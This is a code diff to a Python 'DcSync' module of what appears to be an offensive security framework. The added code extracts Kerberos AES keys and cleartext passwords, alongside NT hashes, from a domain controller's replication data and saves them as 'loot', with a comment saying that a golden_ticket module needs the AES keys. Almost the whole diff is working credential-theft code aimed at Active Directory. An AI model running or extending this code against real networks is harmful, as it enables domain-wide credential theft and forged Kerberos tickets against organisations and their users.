@@ -253,13 +253,26 @@ class DcSync(AuxiliaryModule):
         try:
             ntds._NTDSHashes__decryptHash(resp, out["PrefixTableSrc"]["pPrefixEntry"],
                                           None)
+            # supplemental credentials: Kerberos AES keys + cleartext
+            # passwords — the golden_ticket module needs the AES half.
+            # dump() normally emits these at the end; we drain per user.
+            ntds._NTDSHashes__decryptSupplementalInfo(
+                resp, out["PrefixTableSrc"]["pPrefixEntry"], None, None)
+            kerberos = getattr(ntds, "_NTDSHashes__kerberosKeys", {})
+            for item_key in list(kerberos):
+                self._on_secret(None, item_key)
+            kerberos.clear()
+            cleartext = getattr(ntds, "_NTDSHashes__clearTextPwds", {})
+            for item_key in list(cleartext):
+                self._on_secret(None, item_key)
+            cleartext.clear()
         except Exception as e:
             self.print_debug(f"{name}: decrypt failed: {e}")
 
     def _on_secret(self, secret_type, secret):
         parsed = parse_secret(secret)
         if parsed is None:
-            self.print_debug(f"{self._host}: skipped non-hash output: {secret}")
+            self._on_supplemental(secret)
             return
         user, rid, _, _ = parsed
         self._count += 1
@@ -268,3 +281,22 @@ class DcSync(AuxiliaryModule):
         if self._store is not None:
             self._store.add_loot("hash", f"ntds {user} @ {self._host}",
                                  secret, address=self._host)
+
+    def _on_supplemental(self, secret):
+        """Kerberos AES keys ('user:aes256-cts-hmac-sha1-96:hex') and
+        CLEARTEXT passwords — looted separately from the NT hashes."""
+        if ":aes" in secret:
+            user, key_type, key_hex = secret.split(":", 2)
+            self.print_good(f"{user}: {key_type} {key_hex[:40]}...")
+            if self._store is not None:
+                self._store.add_loot("kerberos-key",
+                                     f"{key_type} {user} @ {self._host}",
+                                     secret, address=self._host)
+        elif ":CLEARTEXT:" in secret:
+            user, _, password = secret.split(":", 2)
+            self.print_good(f"{user}: CLEARTEXT password recovered")
+            if self._store is not None:
+                self._store.add_loot("cleartext", f"{user} @ {self._host}",
+                                     secret, address=self._host)
+        else:
+            self.print_debug(f"{self._host}: skipped non-hash output: {secret}")
